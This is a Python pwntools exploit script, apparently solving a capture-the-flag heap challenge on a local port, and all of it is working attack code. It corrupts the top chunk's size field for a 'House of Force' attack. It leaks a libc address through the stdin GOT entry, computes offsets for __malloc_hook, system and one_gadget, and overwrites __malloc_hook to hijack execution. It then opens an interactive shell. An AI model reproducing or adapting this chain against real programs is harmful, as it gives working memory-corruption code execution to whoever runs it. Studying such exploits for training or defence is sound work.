from pwn import *

context.arch='amd64'

host = '127.0.0.1'
port = 8888
r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(new_top, data, old_top, old_top_size):
    nb = new_top - old_top - 0x10
    allocate_heap(nb, data)
    # print predicted
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10) % 0x10000000000000000
    return new_top, new_top_size

# addresses
glibc_stdin_got = 0x602030
glibc_stdin_off = 0x3c4861
stderr_off = 0x3c5561
__malloc_hook_off = (0x7f4355058b10 - 0x7f4354c9407f)
bin_sh_off = 0x18cc98
one_gadget_off = 0x45216
# one_gadget_off = 0x4526a
# one_gadget_off = 0xf0274
# one_gadget_off = 0xf1117

# DEBUG use:
printf_off = 0x55800
system_off = 0x45390
free_off = 0x3e3f50

# overwrite chunk size
allocate_heap(0x30, b'a')
allocate_heap(0x30, b'a')
allocate_heap(0x38, b'c'*0x38 + p64(0xffffffffffffffff))
r.recvuntil(':')

# leak libc
top = int(input('top: '), 16)
gen_new_top(glibc_stdin_got - 0x10, b'a', top, 0xfffffffffffffff8)
allocate_heap(0x10, b'a', False)
show_heap()
glibc_stdin = u64(r.recvuntil('\n')[1:-1].ljust(8, b'\x00'))
glibc_stdin = (glibc_stdin & 0xffffffffffffff00) + 0xe0
libc = glibc_stdin - glibc_stdin_off
__malloc_hook = libc + __malloc_hook_off
one_gadget = libc + one_gadget_off
print('__malloc_hook =', hex(__malloc_hook))
print('one_gadget    =', hex(one_gadget))

printf = libc + printf_off
system = libc + system_off
bin_sh = libc + bin_sh_off
free = libc + free_off

# change __malloc_hook
allocate_heap(0x38, b'c'*0x38 + p64(0xffffffffffffffff))
r.recvuntil(':')
gen_new_top(__malloc_hook-0x10, b'a', glibc_stdin_got+0x10+0x30+0x10, 0xfffffffffffffff8)
allocate_heap(0x10, p64(0x4006f9))
# allocate_heap(0x10, p64(one_gadget))

# allocate_heap(0x10, b'a')
r.recvuntil(':')
r.sendline(b'1')
r.recvuntil(':')
r.sendline(b'0')

r.interactive()
